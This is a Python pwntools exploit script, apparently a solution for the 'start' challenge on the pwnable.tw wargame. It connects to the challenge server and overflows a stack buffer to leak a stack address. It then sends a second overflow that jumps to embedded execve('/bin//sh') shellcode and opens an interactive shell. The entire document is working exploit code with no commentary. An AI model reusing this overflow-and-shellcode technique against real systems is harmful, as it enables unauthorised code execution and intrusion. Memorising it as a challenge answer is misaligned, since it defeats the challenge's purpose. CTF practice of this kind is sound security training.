from pwn import *
target=remote('chall.pwnable.tw', 10000)
#target=process('./start')

print(target.recvuntil(":"))
payload="A"*20+p32(0x08048087)
target.send(payload)

stack_leak=u32(target.recv()[0:4])
print(hex(stack_leak))
shellcode="\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\x31\xC9\x31\xD2\xCD\x80"
payload="A"*20+p32(stack_leak+20)+shellcode
target.send(payload)

target.interactive()
